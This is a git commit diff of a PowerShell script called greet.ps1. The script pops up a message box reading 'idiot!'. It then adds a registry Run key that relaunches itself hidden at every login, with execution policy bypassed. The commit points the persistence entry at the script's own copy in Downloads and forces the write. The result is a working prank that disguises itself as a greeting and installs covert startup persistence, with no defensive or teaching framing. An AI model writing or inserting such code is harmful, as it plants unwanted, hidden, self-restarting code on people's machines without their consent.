88fcb8962d485cb473b54ec7ced44900b9a21a3c
R0keBee <letcherliam@proton.me>
2025-07-09 02:42:32 -0700

    Update greet.ps1

--- greet.ps1
+++ greet.ps1
@@ -1,13 +1,11 @@
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("idiot!", "Greeting")
 # Set the path to the script or executable
-$scriptPath = "C:\Users\YourUserName\Documents\myscript.ps1"
+$regName = "MyStartupScript"
+$scriptPath = "$env:USERPROFILE\Downloads\greet.ps1"
 
-# Set a name for the registry entry
-$regName = "MyPersistentScript"
-
-# Add to HKCU Run key
 New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                  -Name $regName `
                  -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`"" `
-                 -PropertyType String
+                 -PropertyType String -Force
+
